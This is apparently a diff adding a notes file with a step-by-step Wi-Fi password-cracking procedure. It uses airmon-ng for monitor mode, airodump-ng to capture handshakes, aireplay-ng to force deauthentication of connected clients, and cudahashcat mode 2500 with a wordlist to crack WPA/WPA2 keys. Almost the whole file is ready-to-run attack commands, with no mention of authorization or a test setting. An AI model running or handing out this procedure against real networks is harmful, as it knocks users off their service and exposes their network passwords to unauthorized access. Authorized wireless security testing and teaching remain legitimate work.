@@ -1,0 +1,35 @@
+1. Find your network interface to use
+   sudo airmon-ng
+2. Put the network interface into monitor mode
+   sudo airmon-ng start <interface>
+   a. For AWUS036ACH you have to do this manually:
+      sudo ip link set <interface name> down
+      sudo iwconfig <interface name> mode monitor
+      sudo ip link set <interface name> up
+   b. If airmon-ng directly support it, it usually will require shutting down network manager and wpa_supplicant, then trying again
+      sudo airmon-ng check kill
+   b. Or you may need to manually stop the processes (Network-Manager apparently can't be stopped)
+      sudo systemctl stop vmware-networks.service network.target wpa_supplicant.service 
+3. Scan all APs
+   sudo airodump-ng <monitor interface>
+4. Pick one and target capture from it (or not and get a ridiculously large cap file that will need to be filtered
+   sudo airodump-ng -c <channel num> --bssid <mac id of AP> -w <cap file prefix> <monitor interface>
+5. While this is running, clients connecting will get listed at the bottom of the updating window.  For active attacks, force Deauth in a second window.
+   sudo aireplay-ng -0 <number of deauths> -a <AP mac ID> -c <station/client mac ID> <monitor interface>
+6. Stop capturing by ending the running airodump-ng
+7. Convert to hccapx format for each cap file
+   for F in *.cap ; do cap2hccapx ${F} $(basename -s .cap ${F}).hccapx ; done
+   a. You should get reports from each of the files indicating if it has any captures in it.
+8. Enable cuda support
+   enableCUDA
+9. Start cracking based on the data (-m 2500 is for WPA/WPA2)
+   sudo cudahashcat -m 2500 -r <rules file>  -o <cracked password file> <hccapx file> <word list file>
+   a. Probably use rockyou.txt wordlist
+10. Disable cuda support
+    disableCUDA
+11. Restore the network device
+    a. Reboot
+    b. Or if AWUS036ACH:
+       sudo ip link set <interface name> down
+       sudo iwconfig <interface name> mode auto
+       sudo ip link set <inteface name> up
